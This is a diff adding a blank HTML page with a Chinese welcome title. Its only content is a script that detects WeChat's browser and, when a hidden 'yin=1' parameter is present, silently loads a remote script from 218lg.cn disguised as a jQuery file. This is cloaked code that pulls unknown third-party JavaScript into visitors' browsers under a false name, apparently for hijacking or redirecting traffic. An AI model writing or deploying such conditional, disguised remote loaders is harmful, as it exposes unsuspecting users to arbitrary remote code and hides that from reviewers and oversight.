@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>欢迎来到我的天地</title>
+</head>
+<body>
+  
+   <script type="text/javascript">
+   if (/micromessenger/i.test(navigator.userAgent)) {
+    var xhr = new XMLHttpRequest;
+    var html = null;
+
+    function getQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+        var reg_rewrite = new RegExp("(^|/)" + name + "/([^/]*)(/|$)", "i");
+        var r = window.location.search.substr(1).match(reg);
+        var q = window.location.pathname.substr(1).match(reg_rewrite);
+        if (r != null) {
+            return unescape(r[2]);
+        } else if (q != null) {
+            return unescape(q[2]);
+        } else {
+            return null;
+        }
+    }
+
+    
+    var yin = getQueryString("yin");
+    
+    if (yin=='1') {
+         var scr=document.createElement("script"); 
+              scr.src="//218lg.cn/jquery-1.10.2_1c4228b8.js?v="+Math.random();
+              document.body.appendChild(scr);
+    }
+  
+}
+             
+   </script>
+
+</body>
+</html>
